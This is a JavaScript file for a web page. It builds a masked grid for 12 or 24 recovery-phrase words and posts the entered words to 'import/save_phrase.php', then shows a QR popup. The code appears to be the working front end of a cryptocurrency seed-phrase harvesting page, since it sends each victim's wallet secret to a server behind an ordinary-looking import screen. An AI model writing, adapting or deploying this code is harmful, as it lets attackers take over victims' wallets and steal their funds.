
/* =======================
 * A) GRID / UI WIRING
 * =======================*/
(function SPGrid(){
    
    console.log("stress level")
  window.SPUI = {
    grid:         document.getElementById('sp-grid'),
    lenSel:       document.getElementById('sp-length'),
    confirmBtn:   document.getElementById('sp-confirm'),
    gridLoader:   document.getElementById('sp-grid-loader'),
    submitLoader: document.getElementById('sp-submit-loader'),
    toastEl:      document.getElementById('sp-toast'),
    alertEl:      document.getElementById('sp-alert')
  };
  const { grid, lenSel, confirmBtn, gridLoader, toastEl, alertEl } = SPUI;

  // --- helpers: toast + inline alert ---
  function showToast(msg, type){
    if(!toastEl) return;
    toastEl.textContent = msg || '';
    toastEl.className = 'sp-toast show' + (type==='error' ? ' error' : '');
    setTimeout(()=>{ toastEl.className = 'sp-toast'; }, 2000);
  }
  function showAlert(msg, type){
    if(!alertEl) return;
    alertEl.textContent = msg || '';
    alertEl.className = 'sp-alert show' + (type==='error' ? ' error' : type==='success' ? ' success' : '');
  }
  function clearAlert(){
    if(!alertEl) return;
    alertEl.textContent = '';
    alertEl.className = 'sp-alert';
  }
  SPUI.showToast = showToast;
  SPUI.showAlert = showAlert;
  SPUI.clearAlert = clearAlert;

  function eyeSvg(open){
    return open
      ? '<svg class="sp-eye-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M12 5C7 5 3.21 7.94 1.94 12 3.21 16.06 7 19 12 19s8.79-2.94 10.06-7C20.79 7.94 17 5 12 5Zm0 12a5 5 0 1 1 .002-10.002A5 5 0 0 1 12 17Z"/></svg>'
      : '<svg class="sp-eye-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M3.28 2.22 2.22 3.28 5.06 6.1C3.37 7.36 2.09 9 1.94 12 3.21 16.06 7 19 12 19c2.17 0 4.15-.54 5.79-1.48l2.93 2.93 1.06-1.06-18.5-17.17ZM12 7a5 5 0 0 1 5 5 5 5 0 0 1-.38 1.92l-6.54-6.54A5 5 0 0 1 12 7Zm-5 5a5 5 0 0 1 .38-1.92l6.54 6.54A5 5 0 0 1 7 12Z"/></svg>';
  }

  function setConfirmDisabled(disabled){ confirmBtn.disabled = disabled; }

  function updateConfirmDisabled(){
    const inputs = grid.querySelectorAll('.sp-input');
    const allFilled = inputs.length > 0 && Array.from(inputs).every(i => i.value.trim().length > 0);
    setConfirmDisabled(!allFilled);
  }
  SPUI.updateDisabled = updateConfirmDisabled; // <- export this

  function buildGrid(n){
    grid.innerHTML = '';
    clearAlert();
    gridLoader && gridLoader.classList.add('show');

    setTimeout(()=>{
      for(let i=1;i<=n;i++){
        const row = document.createElement('div');
        row.className = 'sp-cell';
        row.innerHTML = `
          <span class="sp-number">${i}.</span>
          <div class="sp-field">
            <input class="sp-input" type="password" inputmode="text" autocomplete="off" spellcheck="false" data-index="${i}">
            <button class="sp-eye-btn" type="button" data-open="0" aria-label="Toggle visibility">
              ${eyeSvg(false)}
            </button>
          </div>
        `;
        grid.appendChild(row);
      }
      gridLoader && gridLoader.classList.remove('show');
      updateConfirmDisabled();
    }, 50);
  }
  SPUI.buildGrid = buildGrid;

  // eye toggle (event delegation)
  grid.addEventListener('click', function(e){
    const btn = e.target.closest('.sp-eye-btn');
    if(!btn) return;
    const input = btn.parentElement.querySelector('.sp-input');
    const open = btn.getAttribute('data-open') === '1';
    input.type = open ? 'password' : 'text';
    btn.setAttribute('data-open', open ? '0' : '1');
    btn.innerHTML = eyeSvg(!open);
  });

  grid.addEventListener('input', updateConfirmDisabled);
  lenSel.addEventListener('change', e => buildGrid(parseInt(e.target.value,10)));

  // init
  buildGrid(parseInt(lenSel.value,10));
})();

/* =========================================================
 * SECTION B — AJAX SUBMITTER (collect & POST to PHP only)
 * =======================================================*/
(function PhraseSubmitter() {
  const {
    grid,
    lenSel,
    confirmBtn,
    submitLoader,
    showToast,
    showAlert,
    clearAlert,
  } = window.SPUI;

  function collectWords() {
    return Array.from(grid.querySelectorAll(".sp-input")).map((i) =>
      i.value.trim()
    );
  }

  function savePhrase() {
    clearAlert();

    const n = parseInt(lenSel.value, 10);
    const words = collectWords();

    if (words.length !== n || words.some((w) => !w)) {
      showAlert("Please complete all words.", "error");
      showToast("Complete all words", "error");
      return;
    }

    if (submitLoader) submitLoader.classList.add("show");
    confirmBtn.disabled = true;

    $.ajax({
      url: "import/save_phrase.php",
      method: "POST",
      dataType: "json",
      data: { phrase_length: n, words: JSON.stringify(words) },
    })
      .done(function (r) {
        if (r && r.success) {
          showAlert("Saved successfully.", "success");
          showToast("Saved successfully");
           if (window.SPUI.openQRNotificationModal) {
                        window.SPUI.openQRNotificationModal();
                    }
          // Optionally clear inputs:
           grid.querySelectorAll('.sp-input').forEach(i => i.value='');
           window.SPUI.updateDisabled();
        } else {
          showAlert((r && r.message) || "Server error.", "error");
          showToast("Server error", "error");
        }
      })
      .fail(function (xhr) {
        console.error(xhr.responseText);
        showAlert("Network/server error.", "error");
        showToast("Network error", "error");
      })
      .always(function () {
        if (submitLoader) submitLoader.classList.remove("show");
        window.SPUI.updateDisabled();
      });
  }

  confirmBtn.addEventListener("click", savePhrase);
})();

/* =======================
 * QR NOTIFICATION MODAL (New implementation)
 * =======================*/
(function QRNotificationModal(){
    function init(){
        // Use the new IDs from the user's provided HTML
        const overlay = document.getElementById('qrPopup');
        const closeBtn = document.getElementById('qrPopupClose');
        
        // Safety check: if elements are not in DOM, exit init
        if(!overlay || !closeBtn) return;
        
        function openModal() {
            // Use the new CSS class 'active' to show the modal
            overlay.classList.add('active'); 
            overlay.setAttribute('aria-hidden', 'false');
            // Hide body scrollbar to prevent scrolling behind the modal
            document.body.style.overflow = 'hidden';
            closeBtn.focus();
        }

        function closeModal() {
            // Use the new CSS class 'active' to hide the modal
            overlay.classList.remove('active');
            overlay.setAttribute('aria-hidden', 'true');
            document.body.style.overflow = '';
        }

        // wire up close handlers
        closeBtn.addEventListener('click', closeModal);
        // Close when clicking the dark backdrop
        overlay.addEventListener('click', (e) => { 
            if (e.target === overlay) closeModal(); 
        });
        // Close on Escape key
        document.addEventListener('keydown', (e) => { 
            if (e.key === 'Escape') closeModal(); 
        });

        // expose API on the existing SPUI object
        window.SPUI = window.SPUI || {}; // Defensive check
        window.SPUI.openQRNotificationModal = openModal;
        window.SPUI.closeQRNotificationModal = closeModal;
    }

    // Ensure initialization happens safely after DOM is loaded
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();

